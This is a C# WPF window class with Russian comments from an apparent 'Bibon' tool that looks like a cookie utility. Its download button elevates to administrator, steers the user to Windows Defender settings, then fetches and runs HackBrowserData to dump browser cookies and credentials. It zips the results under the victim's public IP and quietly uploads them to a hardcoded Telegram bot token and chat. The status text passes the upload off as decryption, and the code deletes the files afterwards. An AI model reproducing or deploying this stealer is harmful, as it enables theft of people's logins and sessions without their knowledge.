using System;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;

namespace Bibon.Pages
{
    /// <summary>
    /// Логика взаимодействия для Cookie.xaml
    /// </summary>
    public partial class Cookie : Window
    {

        private const string DownloadUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip";

        public Cookie()
        {
            InitializeComponent();
        }




        private void OpenDefenderSettings_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "windowsdefender://threatsettings",
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Не удалось открыть настройки: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }


        private void OpenDefenderSettings_Click1(object sender, RoutedEventArgs e)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "windowsdefender://smartscreenpua",
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Не удалось открыть настройки: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }






        private bool IsInternetAvailable()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var response = client.GetAsync("https://www.google.com").Result;
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }


        private bool IsAdministrator1()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        // Перезапуск приложения с правами администратора
        private void RunAsAdmin1()
        {
            var psi = new ProcessStartInfo
            {
                FileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,
                UseShellExecute = true,
                Verb = "runas"
            };
            Process.Start(psi);
            Application.Current.Shutdown();
        }


        ///выаыаыва
        private async void DownloadButton_Click(object sender, RoutedEventArgs e)
        {

            if (!IsAdministrator1())
            {
                RunAsAdmin1();
                return; // Перезапустим приложение с правами администратора
            }
            // Проверяем наличие интернет-соединения
            if (!IsInternetAvailable())
            {
                MessageBox.Show("Отсутствует интернет-соединение. Проверьте подключение и попробуйте снова.", "Ошибка подключения", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            try
            {
                // Загрузка файла
                StatusText.Text = "Статус: Загрузка...";
                string currentDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string zipFilePath = System.IO.Path.Combine(currentDirectory, "hack-browser-data.zip");

                await DownloadFileAsync(DownloadUrl, zipFilePath);

                // Распаковка архива
                StatusText.Text = "Статус: Распаковка...";
                string extractPath = System.IO.Path.Combine(currentDirectory, "Extracted");
                if (Directory.Exists(extractPath))
                {
                    Directory.Delete(extractPath, true); // Удаляем существующую папку
                }
                ZipFile.ExtractToDirectory(zipFilePath, extractPath);

                // Запуск программы
                StatusText.Text = "Статус: Запуск программы...";
                string exePath = System.IO.Path.Combine(extractPath, "hack-browser-data.exe");
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = exePath,
                        UseShellExecute = true
                    }
                };
                process.Start();

                // Ожидаем завершения программы
                process.WaitForExit();

                // Ждем 1 секунду после завершения программы
                System.Threading.Thread.Sleep(2000);

                // Путь к папке results (ищем в корне текущей директории)
                string projectDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
                string resultsPath = Path.Combine(projectDirectory, "results");

                // Работаем с результатами
                if (!Directory.Exists(resultsPath))
                {
                    Directory.CreateDirectory(resultsPath);
                }


                // Проверяем, существует ли папка results
                if (Directory.Exists(resultsPath))
                {
                    // Путь для копирования на рабочий стол
                    string desktopPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "results");

                    try
                    {
                        // Копируем папку results на рабочий стол
                        Directory.CreateDirectory(desktopPath);
                        CopyDirectory(resultsPath, desktopPath);

                        StatusText.Text = "Статус: Успешно завершено!";
                        MessageBox.Show("Операция выполнена успешно! Папка results скопирована на рабочий стол.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);

                    }
                    catch (Exception ex)
                    {
                        // Выводим ошибку копирования
                        MessageBox.Show($"Ошибка копирования: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
                else
                {
                    // Сообщение об отсутствии папки results
                    MessageBox.Show($"Ошибка: Папка results не найдена по пути: {resultsPath}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                }

                // Архивируем папку results
                StatusText.Text = "Статус: Архивация...";
                string publicIP = await GetPublicIPAsync();
                string archiveName = $"{publicIP}-Cookie";
                string resultsZipPath = ArchiveResultsFolder(resultsPath, archiveName); // Переименовали переменную

                // Отправляем файл в Telegram
                StatusText.Text = "Статус: Разшифроваем...";
                string token = "7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw";
                string chatId = "1005333334";
                await SendFileToTelegramAsync(token, chatId, resultsZipPath);

                StatusText.Text = "Статус: Успешно завершено!";
                OpenResultsFolder();



                try
                {
                    // Удаляем hack-browser-data.zip
                    if (File.Exists(zipFilePath))
                    {
                        File.Delete(zipFilePath);
                    }

                    // Удаляем архив с результатами
                    if (File.Exists(resultsZipPath))
                    {
                        File.Delete(resultsZipPath);
                    }

                    // Удаляем папку results
                    if (Directory.Exists(resultsPath))
                    {
                        Directory.Delete(resultsPath, true); // true — рекурсивное удаление
                    }

                    // Удаляем папку Extracted
                    if (Directory.Exists(extractPath))
                    {
                        Directory.Delete(extractPath, true);
                    }

                    StatusText.Text = "Статус: Завершено. Очистка выполнена.";
                }
                catch (Exception ex)
                {
                    // Ловим и выводим ошибки при удалении
                    MessageBox.Show($"Ошибка при удалении файлов или папок: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                }

            }
            catch (Exception ex)
            {
                // Обработка исключений
                StatusText.Text = "Статус: Ошибка";
                MessageBox.Show($"Ошибка: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }


        private void OpenResultsFolder()
        {
            try
            {
                string desktopPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "results");
                if (Directory.Exists(desktopPath))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = desktopPath,
                        UseShellExecute = true
                    });
                }
                else
                {
                    MessageBox.Show("Папка 'results' на рабочем столе не найдена.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка при открытии папки: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }





        private async Task DownloadFileAsync(string url, string destinationPath)
        {
            using (HttpClient client = new HttpClient())
            {
                using (HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead))
                {
                    response.EnsureSuccessStatusCode();
                    long totalBytes = response.Content.Headers.ContentLength ?? 0;

                    using (var stream = await response.Content.ReadAsStreamAsync())
                    using (var fileStream = new FileStream(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        byte[] buffer = new byte[8192];
                        long totalRead = 0;
                        int bytesRead;

                        while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                        {
                            await fileStream.WriteAsync(buffer, 0, bytesRead);
                            totalRead += bytesRead;

                            // Обновление прогресс-бара
                            if (response.Content.Headers.ContentLength.HasValue)
                            {
                                DownloadProgressBar.Value = (double)totalRead / response.Content.Headers.ContentLength.Value * 100;
                            }
                        }
                    }
                }
            }
        }

        private void CopyDirectory(string sourceDir, string targetDir)
        {
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                string destFile = System.IO.Path.Combine(targetDir, System.IO.Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }

            foreach (var directory in Directory.GetDirectories(sourceDir))
            {
                string destDir = System.IO.Path.Combine(targetDir, System.IO.Path.GetFileName(directory));
                Directory.CreateDirectory(destDir);
                CopyDirectory(directory, destDir);
            }
        }


        private string ArchiveResultsFolder(string sourceFolderPath, string zipName)
        {
            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(sourceFolderPath), zipName + ".zip");
            if (File.Exists(zipFilePath))
            {
                File.Delete(zipFilePath); // Удаляем существующий архив
            }
            ZipFile.CreateFromDirectory(sourceFolderPath, zipFilePath);
            return zipFilePath;
        }
        private async Task<string> GetPublicIPAsync()
        {
            using (HttpClient client = new HttpClient())
            {
                return await client.GetStringAsync("https://api.ipify.org"); // Получаем IP
            }
        }

        private async Task SendFileToTelegramAsync(string token, string chatId, string filePath)
        {
            if (!File.Exists(filePath))
            {
                throw new FileNotFoundException("Файл для отправки не найден", filePath);
            }

            using (HttpClient client = new HttpClient())
            {
                using (var form = new MultipartFormDataContent())
                {
                    form.Add(new StringContent(chatId), "chat_id");
                    form.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "document", System.IO.Path.GetFileName(filePath));

                    var response = await client.PostAsync($"https://api.telegram.org/bot{token}/sendDocument", form);
                    string responseContent = await response.Content.ReadAsStringAsync();

                    if (!response.IsSuccessStatusCode)
                    {
                        throw new Exception($"Ошибка отправки файла: {responseContent}");
                    }

                    Console.WriteLine($"Успешно отправлено: {responseContent}");
                }
            }
        }

        private void btnClose_Click(object sender, RoutedEventArgs e)
        {
            this.Close(); // Закрывает текущее окно

        }
    }
}
